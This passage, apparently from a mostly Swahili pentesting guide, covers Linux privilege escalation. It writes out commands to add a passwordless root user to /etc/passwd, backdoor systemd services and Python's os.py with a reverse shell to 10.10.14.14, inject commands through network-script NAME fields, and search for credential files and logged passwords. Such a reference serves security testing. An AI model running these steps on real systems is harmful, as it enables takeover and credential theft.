hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` kwa `hacker:hacker`

Vinginevyo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji wa bandia bila nywila.\ ONYO: huenda ukapunguza usalama wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
TAARIFA: Katika majukwaa ya BSD `/etc/passwd` iko `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imebadilishwa kuwa `/etc/spwd.db`.

Unapaswa kuangalia kama unaweza **kuandika katika baadhi ya faili nyeti**. Kwa mfano, je, unaweza kuandika kwenye baadhi ya **faili ya usanidi ya huduma**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha seva ya **tomcat** na unaweza **kubadilisha faili ya usanidi wa huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kubadilisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itatekelezwa mara ijayo tomcat itakapowashwa.

### Kagua Mafolda

Mafolda yafuatayo yanaweza kuwa na chelezo au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda hutaweza kusoma ya mwisho lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Mahali Ajabu/Faili Zilizomilikiwa
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizobadilishwa katika dakika chache zilizopita
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Faili za Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml mafayela
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Mafaili yaliyofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Faili za wavuti**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Chelezo**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Faili zinazojulikana zenye passwords

Soma msimbo wa [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **faili kadhaa zinazowezekana ambazo zinaweza kuwa na passwords**.\
**Chombo kingine cha kuvutia** unachoweza kutumia ili kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambayo ni programu ya chanzo wazi inayotumika kupata passwords nyingi zilizohifadhiwa kwenye kompyuta ya eneo kwa Windows, Linux & Mac.

### Logs

Ikiwa unaweza kusoma logs, unaweza kupata **taarifa za kuvutia/za siri ndani yao**. Kadri logi inavyokuwa ya ajabu zaidi, ndivyo itakavyokuwa ya kuvutia zaidi (labda).\
Pia, baadhi ya **mbaya** zilizosetwa (backdoored?) **audit logs** zinaweza kukuwezesha **kurekodi passwords** ndani ya audit logs kama ilivyoelezwa katika chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/]
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**Ili kusoma logi, kundi** [**adm**](interesting-groups-linux-pe/index.html#adm-group) kitakuwa msaada mkubwa.

### Mafaili ya shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Utafutaji wa Creds za Kawaida/Regex

Unapaswa pia kuangalia faili zinazojumuisha neno "**password**" katika **jina** au ndani ya **maudhui**, na pia angalia IPs na emails ndani ya logs, au hashes regexps.\
Sitasema hapa jinsi ya kufanya yote haya lakini ikiwa una nia unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Faili Zinazoweza Kuandikwa

### Python library hijacking

Ikiwa unajua kutoka **wapi** script ya python itatekelezwa na unaweza **kuandika ndani** ya folda hiyo au unaweza **kuhariri python libraries**, unaweza kubadilisha maktaba ya os na kuitia backdoor (ikiwa unaweza kuandika mahali script ya python itatekelezwa, nakili na paste maktaba ya os.py).

Ili **backdoor the library** ongeza tu mwishoni wa maktaba ya os.py mstari ufuatao (badilisha IP na PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Kutumia udhaifu wa logrotate

Udhaifu katika `logrotate` unawawezesha watumiaji walio na **write permissions** kwenye faili ya logi au saraka zake za juu kupata vibali vilivyoongezeka. Hii ni kwa sababu `logrotate`, mara nyingi ikikimbia kama **root**, inaweza kudhibitiwa kutekeleza faili yoyote, hasa katika saraka kama _**/etc/bash_completion.d/**_. Ni muhimu kukagua ruhusa sio tu katika _/var/log_ bali pia katika saraka yoyote ambapo log rotation inafanyika.

> [!TIP]
> Udhaifu huu unaathiri `logrotate` version `3.18.0` and older

Taarifa za kina kuhusu udhaifu zinaweza kupatikana hapa: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kutumia udhaifu huu kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

Udhaifu huu ni sawa sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** hivyo mara yoyote unapoona unaweza kubadilisha logi, angalia nani anayesimamia zile logi na ujaribu kuona kama unaweza kuinua vibali kwa kubadilisha logi kwa symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Rejea ya udhaifu:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ikiwa, kwa sababu yoyote ile, mtumiaji anaweza **write** script ya `ifcf-<whatever>` ndani ya _/etc/sysconfig/network-scripts_ **au** anaweza **adjust** ile iliyopo, basi mfumo wako **is pwned**.

Network scripts, mfano _ifcg-eth0_, hutumika kwa muunganisho wa mtandao. Zinaonekana kama faili za .INI. Hata hivyo, zinakuwa \~sourced\~ kwenye Linux na Network Manager (dispatcher.d).

Katika kesi yangu, sehemu iliyo katika `NAME=` katika network scripts hizi haishughulikiwa ipasavyo. Ikiwa una **white/blank space in the name the system tries to execute the part after the white/blank space**. Hii inamaanisha kwamba **everything after the first blank space is executed as root**.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, na rc.d**

The directory `/etc/init.d` is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

On the other hand, `/etc/init` is associated with **Upstart**, a newer **service management** introduced by Ubuntu, using configuration files for service management tasks. Despite the transition to Upstart, SysVinit scripts are still utilized alongside Upstart configurations due to a compatibility layer in Upstart.

**systemd** emerges as a modern initialization and service manager, offering advanced features such as on-demand daemon starting, automount management, and system state snapshots. It organizes files into `/usr/lib/systemd/` for distribution packages and `/etc/systemd/system/` for administrator modifications, streamlining the system administration process.

## Mbinu nyingine

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Ulinzi wa Usalama wa Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Chombo bora cha kutafuta Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Marejeo

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
